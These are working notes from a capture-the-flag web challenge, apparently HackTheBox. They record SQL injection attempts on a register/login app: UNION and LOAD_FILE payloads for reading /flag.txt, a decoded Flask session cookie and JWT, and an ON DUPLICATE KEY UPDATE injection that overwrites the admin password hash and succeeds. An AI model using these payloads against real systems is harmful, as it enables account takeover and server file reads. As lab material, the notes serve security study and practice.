# Web 3 - Attempt 2

register barrett:password
register guest:guest

register '; update users set password=(select password from users where username='barrett') where username='guest'--
  : sqli1

register ' union select password from users where username='barrett' union select "FAIL" from users
  : sqli2

register ' union select password,"FAIL" from users where username='barrett'
  : sqli3

register ' or 1=1; update users set password=(select password from users where username='barrett') where username='guest'--
  : sqli4

login '; select password from users where username='barrett' and "FAIL"



```txt
register ' UNION ALL SELECT LOAD_FILE('/flag.txt') --
  : sqli5

.eJwdyk0TgUAcgPHv0p1ZEXJjtfmvXpR2J920UeulDCWb8d0Zh-f0e97avqkLbaYdFC1SW0hfUmAdDDwJDyhDQ2AYw_kWc0zN_m8aCJ2r9ErqZPsDKXLODBqhUR6wlwvEI5HFlxwv3AgRK0YJjSxWUWVeU5uUThmOMixugFENspVJXLRwql7eaaf_65hxDPrpJjOr8JE3MHWGyJYyuFurs5oY7VrpToN7buk_k4sf4rn2-QI7rT_V.Y1b8pw.utMKxhrVP9LsDuhUy8fDEBV3zwI

flask-unsign --decode --cookie '.eJwdyk0TgUAcgPHv0p1ZEXJjtfmvXpR2J920UeulDCWb8d0Zh-f0e97avqkLbaYdFC1SW0hfUmAdDDwJDyhDQ2AYw_kWc0zN_m8aCJ2r9ErqZPsDKXLODBqhUR6wlwvEI5HFlxwv3AgRK0YJjSxWUWVeU5uUThmOMixugFENspVJXLRwql7eaaf_65hxDPrpJjOr8JE3MHWGyJYyuFurs5oY7VrpToN7buk_k4sf4rn2-QI7rT_V.Y1b8pw.utMKxhrVP9LsDuhUy8fDEBV3zwI'

{'auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IicgVU5JT04gQUxMIFNFTEVDVCBMT0FEX0ZJTEUoJy9mbGFnLnR4dCcpIC0tIiwiZXhwIjoxNjY2NjY2NzU5fQ.bPd9oRsguI8L30GiiQrEHky75wKy2LuC-MnOvZlORCA'}

{
  "username": "' UNION ALL SELECT LOAD_FILE('/flag.txt') --",
  "exp": 1666666759
}
```

```txt
# register
SELECT * FROM users WHERE username = %s

# login
SELECT password FROM users WHERE username = %s
```

```txt

register ' UNION ALL SELECT LOAD_FILE('/flag.txt') where "FAILME"
  : sqli6

# spills this...who's hash is it though?
$2b$12$cgo18biyFjTIBDHnGBOPtOsIYUEetWT30lqa7yvH2rHtKBPlRZH5y

```

```txt
MySQL truncation.... 'admin' and 'admin ' are considered the same thing

registed 'admin a':password => nothing

username column 255

register 'admin                                                                                                                                                                                                                                                          a'
  : password
# nope
```


```txt
register admin_1:password


exists = query_db('SELECT * FROM users WHERE username = %s', (username,))

query_db(f'INSERT INTO users (username, password) VALUES ("{username}", "{hashed}")')


'admin','') on duplicate key update password=(select password from users where username='guest')
  : wasd


'admin',(select password from users where username='guest')) on duplicate key update username='admin'--

"'admin'") on duplicate key update username='admin',password=(select password from users where username='guest')

'admin"' '"', 




HTB{f4k3_fl4g_f0r_t3st1ng}



junk_user"="junk_user","junk_pwd") UNION ALL select 'admin','bad_hash' ON DUPLICATE KEY UPDATE password = '$2b$12$T3nsWxG0a35/HoNFjJWQUOrv8NEuKwCR1IIRtSt3YhcUyr5y1lVdy' -- -



guest: $2b$12$T3nsWxG0a35/HoNFjJWQUOrv8NEuKwCR1IIRtSt3YhcUyr5y1lVdy

barrett"="barrett" and (1+1) or 'barrett',"$2b$12$tcuJtAuHYkD/Gdmm0FgpT.GZNTWm/HuL6jJlLXU38rmhCMhMglrlq") union all select 'admin','wasd' on duplicate key update password = '' --
```

added query logging to /query-log.txt in container
```python
with open('/app/query.txt', 'w+') as f:
        f.write(str(cursor._executed))
```


```txt
# GOT IT

get bcrypt hash of 'guest';  user:guest&",password:guest

login with

user:
junk_user"="junk_user","junk_pwd") UNION ALL SELECT 'admin','bad_hash' ON DUPLICATE KEY UPDATE password='$2b$12$SjYVDPHynwz1i4auamtyvueWvoGm4PgMheAVZb2J5xDOamwvU2sJ2'-- "

password:
guest
```

```txt
guest&"
$2b$12$QWO1wGzUA7.7N3PNmiCruuLyQVuCTlunOE24zry0J1zGZHUauVARG

user:
junk_user"="junk_user","junk_pwd") UNION ALL SELECT 'admin','bad_hash' ON DUPLICATE KEY UPDATE password='$2b$12$QWO1wGzUA7.7N3PNmiCruuLyQVuCTlunOE24zry0J1zGZHUauVARG'-- "

password:
guest
```


